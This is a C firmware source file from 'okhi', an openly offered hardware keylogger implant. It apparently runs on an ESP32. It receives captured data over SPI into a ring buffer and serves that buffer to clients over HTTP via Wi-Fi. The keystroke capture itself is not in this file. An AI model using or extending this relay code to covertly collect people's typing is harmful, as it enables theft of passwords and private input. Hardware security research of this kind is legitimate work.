/*
MIT License - okhi - Open Keylogger Hardware Implant
---------------------------------------------------------------------------
Copyright (c) [2024] by David Reguera Garcia aka Dreg
https://github.com/therealdreg/okhi
https://www.rootkit.es
X @therealdreg
dreg@rootkit.es
---------------------------------------------------------------------------
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
---------------------------------------------------------------------------
WARNING: BULLSHIT CODE X-)
---------------------------------------------------------------------------
*/

static const char *WIFI_PREFIX = "USB";
static void route_buffer(int client_fd);
static void spi_task(void *pvParameters);

#include "../../../../../last_firmv.h"

#include "../../../com/com.h"

#include "../../../com/com_esp.h"

static void spi_task(void *pvParameters)
{
    int n = 0;
    esp_err_t ret;

    spi_bus_config_t buscfg = {
        .mosi_io_num = GPIO_MOSI,
        .miso_io_num = GPIO_MISO,
        .sclk_io_num = GPIO_SCLK,
        .quadwp_io_num = -1,
        .quadhd_io_num = -1,
    };

    spi_slave_interface_config_t slvcfg = {.mode = 0,
                                           .spics_io_num = GPIO_CS,
                                           .queue_size = 3,
                                           .flags = 0,
                                           .post_setup_cb = my_post_setup_cb,
                                           .post_trans_cb = my_post_trans_cb};

    gpio_config_t io_conf = {
        .intr_type = GPIO_INTR_DISABLE,
        .mode = GPIO_MODE_OUTPUT,
        .pin_bit_mask = BIT64(ELOG_SLAVEREADY_GPIO),
    };

    gpio_config(&io_conf);

    gpio_set_pull_mode(GPIO_MOSI, GPIO_PULLUP_ONLY);
    gpio_set_pull_mode(GPIO_SCLK, GPIO_PULLUP_ONLY);
    gpio_set_pull_mode(GPIO_CS, GPIO_PULLUP_ONLY);

    gpio_set_direction(ELOG_SLAVEREADY_GPIO, GPIO_MODE_OUTPUT);
    gpio_set_level(ELOG_SLAVEREADY_GPIO, 0);
    gpio_set_direction(EBOOT_MASTERDATAREADY_GPIO, GPIO_MODE_INPUT);
    gpio_set_pull_mode(EBOOT_MASTERDATAREADY_GPIO, GPIO_PULLUP_ONLY);

    ret = spi_slave_initialize(RCV_HOST, &buscfg, &slvcfg, SPI_DMA_CH_AUTO);
    assert(ret == ESP_OK);

    WORD_ALIGNED_ATTR unsigned char sendbuf[256] = "";
    WORD_ALIGNED_ATTR unsigned char recvbuf[256] = "";
    spi_slave_transaction_t t;

    unsigned int total_packet_processed = 0;
    while (1)
    {
        memset(recvbuf, 0, sizeof(recvbuf));
        // memset(recvbuf, 0x69, sizeof(recvbuf));
        // sprintf(sendbuf, "This is the receiver, sending data for transmission number %04d.", n);

        memset(sendbuf, 0xFF, sizeof(sendbuf));
        t.length = 256 * 8;
        t.tx_buffer = sendbuf;
        t.rx_buffer = recvbuf;
        gpio_set_level(ELOG_SLAVEREADY_GPIO, 0);
        while (!gpio_get_level(EBOOT_MASTERDATAREADY_GPIO))
        {
            static unsigned int last_up = 0;
            if (last_up != total_packet_processed)
            {
                last_up = total_packet_processed;
                sprintf((char *)buffer_esp, "packets processed: 0x%x", total_packet_processed);
            }
            vTaskDelay(1);
        }
        vTaskDelay(1);
        ret = spi_slave_transmit(RCV_HOST, &t, portMAX_DELAY);
        gpio_set_level(ELOG_SLAVEREADY_GPIO, 0);

        ESP_LOGD(SPI_TAG, "Received (as string): %s", (char *)recvbuf);
        ESP_LOG_BUFFER_HEXDUMP(SPI_TAG, recvbuf, 256, ESP_LOG_DEBUG);

        memcpy((char *)(&(ringbuff[write_index % (RING_BUFF_MAX_ENTRIES - 1)][LINE_SIZE])), recvbuf, LINE_SIZE - 2);
        ESP_LOGD(TAG, "Buffer %s", (char *)(&(ringbuff[write_index % (RING_BUFF_MAX_ENTRIES - 1)][LINE_SIZE])));
        write_index++;
        n++;
        total_packet_processed++;
    }
}

static void route_buffer(int client_fd)
{

    static unsigned int last_sended_i = 0;

    unsigned int target_index = write_index;
    if (last_sended_i != target_index)
    {
        static unsigned char auxbuff[sizeof(ringbuff) + 1];
        memset(auxbuff, 0, sizeof(auxbuff));

        while (last_sended_i != target_index)
        {
            strcat((char *)auxbuff, (char *)&(ringbuff[last_sended_i++ % (RING_BUFF_MAX_ENTRIES - 1)][LINE_SIZE]));
        }
        http_send_status_text(client_fd, "200 OK", (char *)auxbuff);
    }
    else
    {
        http_send_status_text(client_fd, "204 No Content", NULL);
    }
}
